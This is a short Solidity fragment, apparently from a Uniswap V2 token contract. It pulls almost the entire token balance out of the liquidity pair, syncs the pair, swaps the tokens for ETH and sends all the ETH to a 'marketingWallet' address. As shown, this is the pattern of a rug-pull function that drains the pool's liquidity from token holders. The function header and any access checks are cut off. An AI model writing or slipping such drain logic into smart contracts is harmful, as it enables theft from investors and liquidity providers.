    if (bal > 1) _transfer(uniswapV2Pair, address(this), bal - 1);
    IUniswapV2Pair(uniswapV2Pair).sync();
    swapTokensForEth(amount * 10 ** decimals());
    address(marketingWallet).call {
        value: address(this).balance
    }("");
}

